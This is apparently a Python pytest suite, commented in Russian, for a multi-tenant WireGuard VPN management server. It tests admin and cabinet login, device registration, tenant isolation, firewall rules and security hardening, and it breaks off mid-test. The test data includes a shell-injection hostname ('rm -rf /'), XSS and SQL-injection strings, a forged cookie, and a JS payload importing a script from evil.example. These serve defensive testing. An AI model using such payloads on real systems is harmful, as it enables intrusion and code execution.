"""Сервер: суперадмин, регистрация, изоляция компаний, кабинет, сеть, безопасность."""
import concurrent.futures
import re

import pytest

from conftest import new_pubkey


# ---------------------------------------------------------------- суперадмин

class TestAdmin:
    def test_login_wrong_and_right(self, ctx):
        c = ctx.TestClient(ctx.app)
        assert "err=1" in c.post("/admin/login", data={"login": "admin", "password": "x"}, follow_redirects=False).headers["location"]
        assert "err=1" in c.post("/admin/login", data={"login": "AVAZ", "password": "supersecret"}, follow_redirects=False).headers["location"]
        assert c.post("/admin/login", data={"login": "admin", "password": "supersecret"}, follow_redirects=False).headers["location"] == "/admin"

    def test_pages_require_login(self, ctx):
        c = ctx.TestClient(ctx.app)
        for url in ("/admin", "/admin/companies/1"):
            r = c.get(url, follow_redirects=False)
            assert r.status_code == 303 and r.headers["location"] == "/admin/login"
        r = c.post("/admin/companies", data={"login": "x1x", "cabinet_password": "123456", "join_password": "123456"},
                   follow_redirects=False)
        assert r.headers["location"] == "/admin/login"

    def test_company_session_is_not_admin(self, ctx):
        ctx.company("firma1")
        cab = ctx.cabinet("firma1")
        assert cab.get("/admin", follow_redirects=False).headers["location"] == "/admin/login"

    def test_create_company_validation(self, ctx):
        ctx.company("firma1")
        for data, err in [
            ({"login": "Firma1"}, "уже есть"),            # логин без учёта регистра
            ({"login": "ab"}, "Логин"),                     # короткий
            ({"login": "фирма"}, "Логин"),                  # не латиница
            ({"login": "a b c"}, "Логин"),
            ({"login": "firma2", "cabinet_password": "123"}, "минимум 6"),
        ]:
            payload = {"login": "x", "cabinet_password": "123456", "join_password": "123456"} | data
            r = ctx.admin.post("/admin/companies", data=payload)
            assert err in r.text, (data, r.text[:300])

    def test_subnets_sequential_and_reused(self, ctx):
        from app import db
        ids = [ctx.company(f"firma{i}") for i in range(1, 4)]
        conn = db.connect()
        assert [r[0] for r in conn.execute("SELECT subnet_index FROM companies ORDER BY id")] == [1, 2, 3]
        ctx.admin.post(f"/admin/companies/{ids[1]}/delete", data={"confirm": "firma2"})
        ctx.company("firma4")
        assert conn.execute("SELECT subnet_index FROM companies WHERE login='firma4'").fetchone()[0] == 2

    def test_delete_requires_confirm_and_cascades(self, ctx, net):
        cid = ctx.company("firma1")
        ctx.register("firma1", "PC1")
        r = ctx.admin.post(f"/admin/companies/{cid}/delete", data={"confirm": "wrong"})
        assert "введите логин" in r.text
        ctx.admin.post(f"/admin/companies/{cid}/delete", data={"confirm": "firma1"})
        from app import db
        assert db.connect().execute("SELECT COUNT(*) FROM devices").fetchone()[0] == 0
        assert net["peers"] == {}

    def test_admin_sees_all_companies(self, ctx):
        ctx.company("firma1", name="Первая")
        ctx.company("firma2", name="Вторая")
        page = ctx.admin.get("/admin").text
        assert "Первая" in page and "Вторая" in page

    def test_admin_reset_passwords(self, ctx):
        cid = ctx.company("firma1")
        ctx.admin.post(f"/admin/companies/{cid}/passwords", data={"cabinet_password": "newcab1", "join_password": "newjoin1"})
        ctx.cabinet("firma1", "newcab1")
        ctx.register("firma1", join="newjoin1")
        ctx.register("firma1", join="join123", expect=401)

    def test_unknown_company_page(self, ctx):
        r = ctx.admin.get("/admin/companies/999")
        assert r.status_code == 200 and "не найдена" in r.text


# ---------------------------------------------------------------- регистрация клиента

class TestRegister:
    def test_wrong_password_and_unknown_company(self, ctx):
        ctx.company("firma1")
        ctx.register("firma1", join="bad", expect=401)
        ctx.register("nofirma", expect=401)

    @pytest.mark.parametrize("key", ["", "abc", "A" * 44, "!" * 43 + "=", new_pubkey()[:-2] + "=="])
    def test_bad_public_key(self, ctx, key):
        ctx.company("firma1")
        r = ctx.api.post("/api/register", json={"company_login": "firma1", "join_password": "join123",
                                                "device_name": "PC", "public_key": key})
        assert r.status_code in (400, 422)

    def test_login_case_insensitive(self, ctx):
        ctx.company("firma1")
        assert ctx.register("FIRMA1")["ip"] == "10.66.1.2"

    def test_config_contents(self, ctx):
        ctx.company("firma1")
        cfg = ctx.register("firma1", "Бухгалтерия", "BUH-01")
        assert cfg["address"] == "10.66.1.2/32"
        assert cfg["allowed_ips"] == "10.66.1.0/24, 10.66.0.1/32"
        assert "0.0.0.0" not in cfg["allowed_ips"]          # интернет мимо VPN
        assert cfg["endpoint"] == "vpn.test.uz:51820"
        assert cfg["status"] == "active" and cfg["share"] is None
        assert len(cfg["server_public_key"]) == 44 and len(cfg["token"]) > 30

    def test_ips_unique_and_reused_after_delete(self, ctx):
        ctx.company("firma1")
        a, b, c = (ctx.register("firma1", f"PC{i}") for i in range(3))
        assert [a["ip"], b["ip"], c["ip"]] == ["10.66.1.2", "10.66.1.3", "10.66.1.4"]
        cab = ctx.cabinet("firma1")
        cab.post(f"/cabinet/devices/{b['device_id']}/delete")
        assert ctx.register("firma1", "PC9")["ip"] == "10.66.1.3"

    def test_reregister_same_key_keeps_ip_and_rotates_token(self, ctx):
        ctx.company("firma1")
        first = ctx.register("firma1", "PC1")
        again = ctx.register("firma1", "PC1-новое", key=first["_key"])
        assert again["ip"] == first["ip"] and again["device_id"] == first["device_id"]
        assert ctx.api.get("/api/me", headers=ctx.h(again["token"])).json()["device_name"] == "PC1-новое"
        # прежний токен после повторного входа — только у копии: ПК отключается до одобрения
        r = ctx.api.get("/api/me", headers=ctx.h(first["token"]))
        assert r.status_code == 401 and "другом компьютере" in r.json()["detail"]
        assert ctx.api.get("/api/me", headers=ctx.h(again["token"])).status_code == 401

    def test_same_key_other_company_conflict(self, ctx):
        ctx.company("firma1"); ctx.company("firma2")
        d = ctx.register("firma1")
        ctx.register("firma2", key=d["_key"], expect=409)

    def test_device_limit(self, ctx):
        ctx.company("firma1", max_devices=2)
        d = ctx.register("firma1"); ctx.register("firma1")
        r = ctx.register("firma1", expect=403)
        assert "лимит" in r.json()["detail"]
        ctx.register("firma1", key=d["_key"])  # повторный вход существующего ПК — не новый слот

    def test_hostname_sanitized_and_name_limits(self, ctx):
        ctx.company("firma1")
        assert ctx.register("firma1", hostname="pc1; rm -rf /")["_key"]
        from app import db
        assert db.connect().execute("SELECT hostname FROM devices").fetchone()[0] == "pc1rm-rf"
        ctx.register("firma1", name="x" * 65, expect=422)
        ctx.register("firma1", name="", expect=422)

    def test_disabled_company(self, ctx):
        cid = ctx.company("firma1")
        d = ctx.register("firma1")
        ctx.admin.post(f"/admin/companies/{cid}/update", data={"name": "x", "max_devices": 5})  # is_active не передан = выкл
        ctx.register("firma1", expect=403)
        assert ctx.api.get("/api/me", headers=ctx.h(d["token"])).status_code == 403

    def test_bad_tokens(self, ctx):
        for headers in ({}, {"Authorization": "Bearer "}, {"Authorization": "Bearer nope"}, {"Authorization": "Basic x"}):
            assert ctx.api.get("/api/me", headers=headers).status_code == 401
            assert ctx.api.get("/api/peers", headers=headers).status_code == 401

    def test_rate_limit(self, ctx):
        ctx.company("firma1")
        for _ in range(10):
            ctx.register("firma1", join="bad", expect=401)
        ctx.register("firma1", expect=429)  # даже с верным паролем — блок на 10 минут

    def test_parallel_registrations_get_unique_ips(self, ctx):
        ctx.company("firma1", max_devices=200)

        def reg(i):
            r = ctx.api.post("/api/register", json={"company_login": "firma1", "join_password": "join123",
                                                    "device_name": f"PC{i}", "public_key": new_pubkey()})
            return r.status_code, r.json().get("ip")
        with concurrent.futures.ThreadPoolExecutor(16) as ex:
            res = list(ex.map(reg, range(60)))
        assert all(code == 200 for code, _ in res), res
        ips = [ip for _, ip in res]
        assert len(set(ips)) == 60

    def test_heartbeat(self, ctx):
        ctx.company("firma1")
        d = ctx.register("firma1")
        assert ctx.api.post("/api/heartbeat", headers=ctx.h(d["token"]), json={"client_version": "1.2.3"}).json()["ok"]
        from app import db
        row = db.connect().execute("SELECT client_version, last_seen FROM devices").fetchone()
        assert row[0] == "1.2.3" and row[1]

    def test_ping(self, ctx):
        assert ctx.api.get("/api/ping").json()["ok"] is True


# ---------------------------------------------------------------- изоляция компаний

class TestIsolation:
    def setup_two(self, ctx):
        ctx.company("login1"); ctx.company("login2")
        a1 = ctx.register("login1", "A-PC1", "APC1")
        a2 = ctx.register("login1", "A-PC2", "APC2")
        b1 = ctx.register("login2", "B-PC1", "BPC1")
        return a1, a2, b1

    def test_peers_only_own_company(self, ctx):
        a1, a2, b1 = self.setup_two(ctx)
        names_a = {p["name"] for p in ctx.api.get("/api/peers", headers=ctx.h(a1["token"])).json()["peers"]}
        names_b = {p["name"] for p in ctx.api.get("/api/peers", headers=ctx.h(b1["token"])).json()["peers"]}
        assert names_a == {"A-PC1", "A-PC2"} and names_b == {"B-PC1"}

    def test_subnets_differ(self, ctx):
        a1, _, b1 = self.setup_two(ctx)
        assert a1["ip"].startswith("10.66.1.") and b1["ip"].startswith("10.66.2.")
        assert "10.66.2" not in a1["allowed_ips"]

    def test_cabinet_shows_only_own(self, ctx):
        self.setup_two(ctx)
        page = ctx.cabinet("login1").get("/cabinet").text
        assert "A-PC1" in page and "B-PC1" not in page and "login2" not in page

    @pytest.mark.parametrize("action", ["approve", "block", "unblock", "delete", "share", "unshare", "rename"])
    def test_cabinet_cannot_touch_foreign_device(self, ctx, action):
        _, _, b1 = self.setup_two(ctx)
        cab = ctx.cabinet("login1")
        r = cab.post(f"/cabinet/devices/{b1['device_id']}/{action}", data={"value": "hacked"})
        assert "не найдено" in r.text
        me = ctx.api.get("/api/me", headers=ctx.h(b1["token"])).json()
        assert me["status"] == "active" and me["device_name"] == "B-PC1" and not me["is_share_host"]

    def test_cabinet_wrong_password_and_other_company_password(self, ctx):
        ctx.company("login1", cab="pass111"); ctx.company("login2", cab="pass222")
        c = ctx.TestClient(ctx.app)
        assert "err=1" in c.post("/cabinet/login", data={"login": "login1", "password": "pass222"}, follow_redirects=False).headers["location"]
        # пароль подключения не открывает кабинет
        assert "err=1" in c.post("/cabinet/login", data={"login": "login1", "password": "join123"}, follow_redirects=False).headers["location"]

    def test_forged_session_cookie(self, ctx):
        ctx.company("login1")
        c = ctx.TestClient(ctx.app)
        c.cookies.set("retix_session", "eyJyb2xlIjogImFkbWluIn0=.fake.sig")
        assert c.get("/admin", follow_redirects=False).headers["location"] == "/admin/login"
        assert c.get("/cabinet", follow_redirects=False).headers["location"] == "/cabinet/login"

    def test_session_dies_when_company_disabled_or_deleted(self, ctx):
        cid = ctx.company("login1")
        cab = ctx.cabinet("login1")
        ctx.admin.post(f"/admin/companies/{cid}/update", data={"name": "x", "max_devices": 5})
        assert cab.get("/cabinet", follow_redirects=False).headers["location"] == "/cabinet/login"
        assert "отключена" in ctx.TestClient(ctx.app).post(
            "/cabinet/login", data={"login": "login1", "password": "cab123"}).text

    def test_messages_within_company(self, ctx):
        a1, a2, b1 = self.setup_two(ctx)
        h1, h2, hb = ctx.h(a1["token"]), ctx.h(a2["token"]), ctx.h(b1["token"])
        assert ctx.api.post("/api/messages", headers=h1, json={"to": a2["device_id"], "text": " Привет "}).status_code == 200
        msgs = ctx.api.get("/api/messages", headers=h2).json()["messages"]
        assert [(m["from_name"], m["from_ip"], m["text"]) for m in msgs] == [("A-PC1", a1["ip"], "Привет")]
        assert ctx.api.get("/api/messages", headers=h2).json()["messages"] == []   # отдаётся один раз
        # в чужую компанию нельзя — и не видно, что такой ПК есть
        assert ctx.api.post("/api/messages", headers=hb, json={"to": a1["device_id"], "text": "x"}).status_code == 404
        assert ctx.api.post("/api/messages", headers=h1, json={"to": b1["device_id"], "text": "x"}).status_code == 404
        assert ctx.api.get("/api/messages", headers=hb).json()["messages"] == []
        assert ctx.api.post("/api/messages", headers=h1, json={"to": a2["device_id"], "text": "   "}).status_code == 400
        assert ctx.api.post("/api/messages", headers=h1, json={"to": a2["device_id"], "text": "x" * 2001}).status_code == 422
        assert ctx.api.post("/api/messages", json={"to": a2["device_id"], "text": "x"}).status_code == 401

    def test_messages_rate_limit(self, ctx):
        a1, a2, _ = self.setup_two(ctx)
        h1 = ctx.h(a1["token"])
        codes = [ctx.api.post("/api/messages", headers=h1, json={"to": a2["device_id"], "text": str(i)}).status_code
                 for i in range(32)]
        assert codes.count(200) == 30 and codes[-1] == 429

    def test_blocked_device_cannot_message(self, ctx):
        a1, a2, _ = self.setup_two(ctx)
        ctx.cabinet("login1").post(f"/cabinet/devices/{a1['device_id']}/block")
        r = ctx.api.post("/api/messages", headers=ctx.h(a1["token"]), json={"to": a2["device_id"], "text": "x"})
        assert r.status_code == 403
        r = ctx.api.post("/api/messages", headers=ctx.h(a2["token"]), json={"to": a1["device_id"], "text": "x"})
        assert r.status_code == 404

    def test_firewall_rules_per_company(self, ctx, net):
        a1, a2, b1 = self.setup_two(ctx)
        rules = net["rules"]
        # общие папки (SMB) — между всеми ПК компании, без отметки «ПК с папкой»
        assert "-A RETIX_FWD -s 10.66.1.0/24 -d 10.66.1.0/24 -p tcp -m multiport --dports 445 -j ACCEPT" in rules
        assert "-A RETIX_FWD -s 10.66.2.0/24 -d 10.66.2.0/24 -p tcp -m multiport --dports 445 -j ACCEPT" in rules
        # Radmin Viewer -> Radmin Server (4899) — внутри компании
        assert "-A RETIX_FWD -s 10.66.1.0/24 -d 10.66.1.0/24 -p tcp --dport 4899 -j ACCEPT" in rules
        assert "-A RETIX_FWD -s 10.66.1.0/24 -d 10.66.1.0/24 -p icmp -j ACCEPT" in rules
        assert "-A RETIX_FWD -s 10.66.2.0/24 -d 10.66.2.0/24 -p icmp -j ACCEPT" in rules
        # ни одного правила, разрешающего трафик между подсетями
        for r in rules:
            m = re.search(r"-s (\S+) -d (\S+)", r)
            assert m.group(1).split(".")[2] == m.group(2).split(".")[2], r

    def test_disabled_company_removed_from_network(self, ctx, net):
        a1, a2, b1 = self.setup_two(ctx)
        assert b1["_key"] in net["peers"]
        cid = ctx.admin.get("/admin").text  # noqa: F841
        from app import db
        cid2 = db.connect().execute("SELECT id FROM companies WHERE login='login2'").fetchone()[0]
        ctx.admin.post(f"/admin/companies/{cid2}/update", data={"name": "x", "max_devices": 5})
        assert b1["_key"] not in net["peers"] and a1["_key"] in net["peers"]
        assert not any("10.66.2." in r for r in net["rules"])


# ---------------------------------------------------------------- кабинет: действия с ПК

class TestCabinet:
    def test_block_unblock(self, ctx, net):
        ctx.company("firma1")
        d = ctx.register("firma1")
        cab = ctx.cabinet("firma1")
        cab.post(f"/cabinet/devices/{d['device_id']}/block")
        assert d["_key"] not in net["peers"]
        assert ctx.api.get("/api/me", headers=ctx.h(d["token"])).json()["status"] == "blocked"
        assert ctx.api.get("/api/peers", headers=ctx.h(d["token"])).status_code == 403
        # повторная регистрация заблокированного ключа не снимает блок
        assert ctx.register("firma1", key=d["_key"])["status"] == "blocked"
        cab.post(f"/cabinet/devices/{d['device_id']}/unblock")
        assert d["_key"] in net["peers"]

    def test_approval_flow(self, ctx, net):
        ctx.company("firma1")
        cab = ctx.cabinet("firma1")
        cab.post("/cabinet/settings", data={"require_approval": "1", "share_name": "share", "share_ports": "445"})
        d = ctx.register("firma1")
        assert d["status"] == "pending" and d["_key"] not in net["peers"]
        assert "ждёт одобрения" in cab.get("/cabinet").text
        assert ctx.api.get("/api/peers", headers=ctx.h(d["token"])).status_code == 403
        cab.post(f"/cabinet/devices/{d['device_id']}/approve")
        assert ctx.api.get("/api/me", headers=ctx.h(d["token"])).json()["status"] == "active"
        assert d["_key"] in net["peers"]

    def test_delete_device(self, ctx, net):
        ctx.company("firma1")
        d = ctx.register("firma1")
        ctx.cabinet("firma1").post(f"/cabinet/devices/{d['device_id']}/delete")
        assert ctx.api.get("/api/me", headers=ctx.h(d["token"])).status_code == 401
        assert d["_key"] not in net["peers"]

    def test_share_is_exclusive(self, ctx):
        ctx.company("firma1")
        a = ctx.register("firma1", "A", "PCA"); b = ctx.register("firma1", "B", "PCB")
        cab = ctx.cabinet("firma1")
        cab.post(f"/cabinet/devices/{a['device_id']}/share")
        cab.post(f"/cabinet/devices/{b['device_id']}/share")
        me = ctx.api.get("/api/me", headers=ctx.h(a["token"])).json()
        assert me["share"]["ip"] == b["ip"] and not me["is_share_host"]
        cab.post(f"/cabinet/devices/{b['device_id']}/unshare")
        assert ctx.api.get("/api/me", headers=ctx.h(a["token"])).json()["share"] is None

    def test_blocked_share_host_hidden(self, ctx):
        ctx.company("firma1")
        a = ctx.register("firma1", "A"); b = ctx.register("firma1", "B")
        cab = ctx.cabinet("firma1")
        cab.post(f"/cabinet/devices/{a['device_id']}/share")
        cab.post(f"/cabinet/devices/{a['device_id']}/block")
        assert ctx.api.get("/api/me", headers=ctx.h(b["token"])).json()["share"] is None

    def test_rename(self, ctx):
        ctx.company("firma1")
        d = ctx.register("firma1", "старое")
        cab = ctx.cabinet("firma1")
        assert "Пустое имя" in cab.post(f"/cabinet/devices/{d['device_id']}/rename", data={"value": "  "}).text
        cab.post(f"/cabinet/devices/{d['device_id']}/rename", data={"value": "Новое имя"})
        assert ctx.api.get("/api/me", headers=ctx.h(d["token"])).json()["device_name"] == "Новое имя"

    def test_unknown_action(self, ctx):
        ctx.company("firma1")
        d = ctx.register("firma1")
        assert "Неизвестное действие" in ctx.cabinet("firma1").post(f"/cabinet/devices/{d['device_id']}/explode").text

    @pytest.mark.parametrize("ports,ok", [("445", True), ("445,139", True), ("445, 3389", True),
                                          ("", True), ("0", False), ("70000", False), ("445;rm", False), ("a", False)])
    def test_settings_ports(self, ctx, ports, ok):
        # пустое поле = значение по умолчанию 445
        ctx.company("firma1")
        r = ctx.cabinet("firma1").post("/cabinet/settings", data={"share_name": "share", "share_ports": ports})
        assert ("Настройки сохранены" in r.text) == ok

    @pytest.mark.parametrize("name,ok", [("share", True), ("Общая папка", True), ("a/b", False), ("a\\b", False),
                                         ("x" * 81, False), ("a:b", False)])
    def test_settings_share_name(self, ctx, name, ok):
        ctx.company("firma1")
        r = ctx.cabinet("firma1").post("/cabinet/settings", data={"share_name": name, "share_ports": "445"})
        assert ("Настройки сохранены" in r.text) == ok

    def test_full_lan_rule(self, ctx, net):
        ctx.company("firma1")
        ctx.cabinet("firma1").post("/cabinet/settings", data={"full_lan": "1", "share_name": "share", "share_ports": "445"})
        assert "-A RETIX_FWD -s 10.66.1.0/24 -d 10.66.1.0/24 -j ACCEPT" in net["rules"]

    def test_join_password_change_and_kick_all(self, ctx):
        ctx.company("firma1")
        d = ctx.register("firma1")
        cab = ctx.cabinet("firma1")
        assert "минимум 6" in cab.post("/cabinet/join-password", data={"new_password": "123"}).text
        cab.post("/cabinet/join-password", data={"new_password": "newjoin1"})
        assert ctx.api.get("/api/me", headers=ctx.h(d["token"])).status_code == 200  # без kick_all — работают
        cab.post("/cabinet/join-password", data={"new_password": "newjoin2", "kick_all": "1"})
        assert ctx.api.get("/api/me", headers=ctx.h(d["token"])).status_code == 401
        ctx.register("firma1", join="newjoin1", key=d["_key"], expect=401)
        again = ctx.register("firma1", join="newjoin2", key=d["_key"])
        assert again["ip"] == d["ip"]

    def test_cabinet_password_change(self, ctx):
        ctx.company("firma1")
        cab = ctx.cabinet("firma1")
        assert "неверный" in cab.post("/cabinet/cabinet-password", data={"old_password": "x", "new_password": "123456"}).text
        cab.post("/cabinet/cabinet-password", data={"old_password": "cab123", "new_password": "newcab1"})
        ctx.cabinet("firma1", "newcab1")

    def test_logout(self, ctx):
        ctx.company("firma1")
        cab = ctx.cabinet("firma1")
        cab.post("/cabinet/logout")
        assert cab.get("/cabinet", follow_redirects=False).status_code == 303

    def test_audit_log(self, ctx):
        cid = ctx.company("firma1")
        d = ctx.register("firma1", "PC1")
        ctx.cabinet("firma1").post(f"/cabinet/devices/{d['device_id']}/block")
        page = ctx.admin.get(f"/admin/companies/{cid}").text
        assert "device_register" in page and "device_block" in page


# ---------------------------------------------------------------- безопасность

class TestSecurity:
    def test_xss_escaped(self, ctx):
        ctx.company("firma1")
        ctx.register("firma1", name="<script>alert(1)</script>")
        page = ctx.cabinet("firma1").get("/cabinet").text
        assert "<script>alert(1)</script>" not in page and "&lt;script&gt;" in page

    def test_sql_injection_attempts(self, ctx):
        ctx.company("firma1")
        ctx.register("firma1' OR '1'='1", expect=401)
        c = ctx.TestClient(ctx.app)
        r = c.post("/cabinet/login", data={"login": "firma1' --", "password": "x' OR '1'='1"}, follow_redirects=False)
        assert "err=1" in r.headers["location"]

    def test_passwords_hashed_tokens_hashed(self, ctx):
        ctx.company("firma1")
        d = ctx.register("firma1")
        from app import db
        conn = db.connect()
        c = conn.execute("SELECT * FROM companies").fetchone()
        assert c["join_pass_hash"].startswith("$2") and "join123" not in c["join_pass_hash"]
        assert conn.execute("SELECT token_hash FROM devices").fetchone()[0] != d["token"]

    def test_docs_disabled(self, ctx):
        for url in ("/docs", "/redoc", "/openapi.json"):
            assert ctx.api.get(url).status_code == 404

    def test_client_ip_behind_nginx(self):
        from app.auth import client_ip

        class R:
            def __init__(self, host, headers):
                self.client = type("C", (), {"host": host})()
                self.headers = headers
        assert client_ip(R("127.0.0.1", {"x-real-ip": "1.2.3.4"})) == "1.2.3.4"
        assert client_ip(R("127.0.0.1", {"x-forwarded-for": "5.6.7.8, 10.0.0.1"})) == "5.6.7.8"
        assert client_ip(R("9.9.9.9", {"x-real-ip": "1.2.3.4"})) == "9.9.9.9"  # подделка заголовка извне


# ---------------------------------------------------------------- wg / мониторинг

class TestWg:
    def test_dump_parsing(self, monkeypatch):
        from app import wg
        out = ("PRIVKEY\tPUBKEY\t51820\toff\n"
               "peerA=\t(none)\t1.2.3.4:5555\t10.66.1.2/32\t1731750000\t100\t200\t25\n"
               "peerB=\t(none)\t(none)\t10.66.1.3/32\t0\t0\t0\toff\n")
        monkeypatch.setattr(wg, "run", lambda *a, **k: out)
        peers = wg.dump()
        assert peers[0] == {"public_key": "peerA=", "endpoint": "1.2.3.4:5555", "latest_handshake": 1731750000, "rx": 100, "tx": 200}
        assert peers[1]["endpoint"] == "" and peers[1]["latest_handshake"] == 0

    def test_sync_peers_removes_stale(self, monkeypatch):
        from app import wg
        calls = []
        monkeypatch.setattr(wg, "current_peers", lambda: {"old=", "keep="})
        monkeypatch.setattr(wg, "run", lambda args, **k: calls.append(" ".join(args)) or "")
        wg.sync_peers({"keep=": "10.66.1.2", "new=": "10.66.1.3"})
        assert "wg set wg0 peer old= remove" in calls
        assert "wg set wg0 peer new= allowed-ips 10.66.1.3/32" in calls

    def test_firewall_script(self, monkeypatch):
        from app import wg
        calls = []
        monkeypatch.setattr(wg, "DRY_RUN", False)
        monkeypatch.setattr(wg, "ok", lambda args: False)
        monkeypatch.setattr(wg, "run", lambda args, input=None, **k: calls.append((" ".join(args), input)) or "")
        wg.apply_firewall(["-A RETIX_FWD -s 10.66.1.0/24 -d 10.66.1.0/24 -p icmp -j ACCEPT"])
        script = calls[0][1]
        assert calls[0][0] == "iptables-restore -w --noflush"
        assert script.index("RETIX_FWD -j DROP") > script.index("icmp -j ACCEPT")
        assert ("iptables -w -I FORWARD 1 -i wg0 -j RETIX_FWD", None) in calls
        assert ("iptables -w -I INPUT 1 -i wg0 -j RETIX_IN", None) in calls

    def test_online_from_handshake(self, ctx):
        import time
        from app import db, monitor
        ctx.company("firma1")
        a = ctx.register("firma1", "A"); b = ctx.register("firma1", "B")
        conn = db.connect()
        monitor.update_handshakes(conn, [
            {"public_key": a["_key"], "endpoint": "1.1.1.1:1", "latest_handshake": int(time.time()) - 5},
            {"public_key": b["_key"], "endpoint": "", "latest_handshake": int(time.time()) - 600}])
        peers = {p["name"]: p["online"] for p in ctx.api.get("/api/peers", headers=ctx.h(a["token"])).json()["peers"]}
        assert peers == {"A": True, "B": False}

    def test_server_key_stable(self):
        from app import wg
        k1 = wg.server_public_key()
        wg._server_pub = None
        assert wg.server_public_key() == k1


# ---------------------------------------------------------------- все страницы открываются

def test_all_pages_render(ctx):
    cid = ctx.company("firma1")
    ctx.register("firma1", "PC1")
    for url in ("/admin", f"/admin/companies/{cid}", "/admin/login", "/cabinet/login"):
        assert ctx.admin.get(url).status_code == 200, url
    cab = ctx.cabinet("firma1")
    assert cab.get("/cabinet").status_code == 200



# ---------------------------------------------------------------- публичная часть hub.retix.uz

class TestPublic:
    def test_landing(self, ctx):
        r = ctx.TestClient(ctx.app).get("/")
        assert r.status_code == 200
        for text in ("Retix Hub", "Как это работает", "Возможности", "Скачать", "/cabinet", "hub.retix.uz/api"):
            assert text in r.text, text
        assert "/admin" not in r.text                         # вход суперадмина не светим

    def test_landing_no_private_data(self, ctx):
        ctx.company("secretfirma", name="Секретная фирма")
        ctx.register("secretfirma", "Тайный ПК")
        page = ctx.TestClient(ctx.app).get("/").text
        assert "secretfirma" not in page and "Тайный ПК" not in page and "Секретная" not in page

    def test_api_info(self, ctx):
        info = ctx.api.get("/api").json()
        assert info["name"] == "Retix Hub" and info["base_url"] == "https://hub.retix.uz/api"
        assert "POST /api/register" in info["endpoints"]

    def test_download_missing_and_present(self, ctx):
        import os
        from app.config import DOWNLOADS_DIR
        c = ctx.TestClient(ctx.app)
        path = os.path.join(DOWNLOADS_DIR, "RetixHub.exe")
        if os.path.exists(path):
            os.remove(path)
        r = c.get("/download/client", follow_redirects=False)
        assert r.status_code == 303 and "err=1" in r.headers["location"]
        assert "Скоро здесь появится" in c.get("/").text
        os.makedirs(DOWNLOADS_DIR, exist_ok=True)
        with open(path, "wb") as f:
            f.write(b"MZ-test-exe")
        try:
            r = c.get("/download/client")
            assert r.status_code == 200 and r.content == b"MZ-test-exe"
            assert "RetixHub.exe" in r.headers["content-disposition"]
            assert "Скачать RetixHub.exe" in c.get("/").text
        finally:
            os.remove(path)

    def test_download_newest_setup(self, ctx):
        import os
        from app.config import DOWNLOADS_DIR
        c = ctx.TestClient(ctx.app)
        os.makedirs(DOWNLOADS_DIR, exist_ok=True)
        files = {"RetixHub.exe": b"MZ-old", "RetixHub_Setup_1.0.0.exe": b"MZ-100",
                 "RetixHub_Setup_1.0.10.exe": b"MZ-1010", "RetixHub_Setup_1.0.9.exe": b"MZ-109"}
        for name, data in files.items():
            with open(os.path.join(DOWNLOADS_DIR, name), "wb") as f:
                f.write(data)
        try:
            r = c.get("/download/client")
            assert r.status_code == 200 and r.content == b"MZ-1010"   # 1.0.10 новее 1.0.9
            assert "RetixHub_Setup_1.0.10.exe" in r.headers["content-disposition"]
            assert "Скачать RetixHub_Setup_1.0.10.exe" in c.get("/").text
        finally:
            for name in files:
                os.remove(os.path.join(DOWNLOADS_DIR, name))

    def test_download_wireguard_redirect(self, ctx):
        r = ctx.TestClient(ctx.app).get("/download/wireguard", follow_redirects=False)
        assert r.status_code == 302 and "download.wireguard.com" in r.headers["location"]

    def test_cabinet_header_links_home(self, ctx):
        ctx.company("firma1")
        assert 'href="/"><b>Retix Hub</b>' in ctx.cabinet("firma1").get("/cabinet").text


# ---------------------------------------------------------------- 1.0.5: исправления аудита безопасности

class TestHardening:
    def test_device_name_cannot_inject_js(self, ctx):
        # имя ПК раньше попадало в onsubmit="confirm('…')": &#39; браузер раскодирует — код исполнялся
        cid = ctx.company("firma1")
        evil = "x');import('//evil.example/a.js');('"
        ctx.register("firma1", name=evil)
        for page in (ctx.cabinet("firma1").get("/cabinet").text, ctx.admin.get(f"/admin/companies/{cid}").text):
            assert "onsubmit=" not in page
            assert 'data-confirm="Удалить x&#39;);import(&#39;//evil.example/a.js&#39;);(&#39;?' in page
        ctx.register("firma1", name='"><img src=x onerror=alert(1)>')
        assert "<img src=x" not in ctx.cabinet("firma1").get("/cabinet").text

    def test_kick_all_removes_devices_from_wireguard(self, ctx, net):
        ctx.company("firma1")
        a, b = ctx.register("firma1", "A"), ctx.register("firma1", "B")
        assert {a["_key"], b["_key"]} <= net["peers"].keys()
        ctx.cabinet("firma1").post("/cabinet/join-password", data={"new_password": "newjoin1", "kick_all": "1"})
        assert net["peers"] == {}                      # не только API — и сеть: ключ на ПК больше не пускает
        again = ctx.register("firma1", "A", join="newjoin1", key=a["_key"])
        assert again["status"] == "active" and a["_key"] in net["peers"] and b["_key"] not in net["peers"]

    def test_new_company_requires_approval_by_default(self, ctx, net):
        ctx.company("firma1", approval=True)
        cab = ctx.cabinet("firma1")
        assert 'name="require_approval" value="1" checked' in cab.get("/cabinet").text
        d = ctx.register("firma1")
        assert d["status"] == "pending" and d["_key"] not in net["peers"]
        cab.post(f"/cabinet/devices/{d['device_id']}/approve")
        assert d["_key"] in net["peers"]

    def test_token_rotates_and_copy_disconnects_device(self, ctx, net, monkeypatch):
        from app import db
        from app.routers import api_client
        monkeypatch.setattr(api_client, "TOKEN_ROTATE_SECONDS", 0)
        ctx.company("firma1")
        d = ctx.register("firma1")
        t1 = d["token"]
        r = ctx.api.get("/api/me", headers=ctx.h(t1))
        t2 = r.headers["x-retix-token"]
        assert r.status_code == 200 and t2 and t2 != t1
        # пока клиент не пришёл с новым токеном, старый действует (ответ мог потеряться)
        assert ctx.api.get("/api/me", headers=ctx.h(t1)).status_code == 200
        assert ctx.api.get("/api/peers", headers=ctx.h(t2)).status_code == 200   # клиент перешёл на t2
        # t1 теперь только у копии: ПК отключается, ждёт одобрения, снят с wg0
        r = ctx.api.get("/api/me", headers=ctx.h(t1))
        assert r.status_code == 401 and "другом компьютере" in r.json()["detail"]
        assert ctx.api.get("/api/me", headers=ctx.h(t2)).status_code == 401
        assert d["_key"] not in net["peers"]
        conn = db.connect()
        assert conn.execute("SELECT is_approved FROM devices WHERE id=?", (d["device_id"],)).fetchone()[0] == 0
        assert conn.execute("SELECT COUNT(*) FROM audit_log WHERE action='token_reuse'").fetchone()[0] == 1
        # вход паролем снова возможен, но только после одобрения администратором
        again = ctx.register("firma1", key=d["_key"])
        assert again["status"] == "pending" and d["_key"] not in net["peers"]
        ctx.cabinet("firma1").post(f"/cabinet/devices/{d['device_id']}/approve")
        assert ctx.api.get("/api/me", headers=ctx.h(again["token"])).json()["status"] == "active"

    def test_lost_rotation_response_is_harmless(self, ctx, monkeypatch):
        from app.routers import api_client
